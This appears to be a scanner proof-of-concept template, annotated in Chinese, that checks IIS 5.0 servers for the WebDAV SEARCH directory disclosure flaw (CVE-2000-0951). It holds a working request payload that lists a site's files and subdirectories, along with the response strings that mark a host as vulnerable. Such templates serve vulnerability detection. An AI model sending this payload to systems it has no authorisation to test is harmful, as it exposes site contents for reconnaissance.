[info]
author = "ave"
description = "向 IIS 5.0 服务器发送 WebDAV SEARCH 请求，利用 Index Server 的搜索功能遍历 Web 根目录下的文件与子目录列表。若响应包含目录名或文件列表，则目标存在漏洞。"
id = "POC-AVE-2000-0693"
name = "Microsoft IIS 5.0 WebDAV 搜索目录泄露漏洞 PoC"
severity = "medium"
tags = ["ave-2000-0693"]
vuln_id = [
    "CVE-2000-0951",
    "AVE-2000-0693",
]

[poc]
logic = "any"

[[poc.requests]]
method = "SEARCH"
path = "/{{BaseURL}}/"
protocol = "http"

[poc.requests.body]
content = """
<?xml version="1.0"?>
<g:searchrequest xmlns:g="DAV:">
<g:sql>
Select "DAV:displayname" from scope()
</g:sql>
</g:searchrequest>"""
type = "raw"

[poc.requests.headers]
Content-Type = "text/xml"

[[poc.requests.matchers]]
expect = true
part = "body"
type = "word"
words = [
    "207 Multi-Status",
    "displayname",
    "href",
]
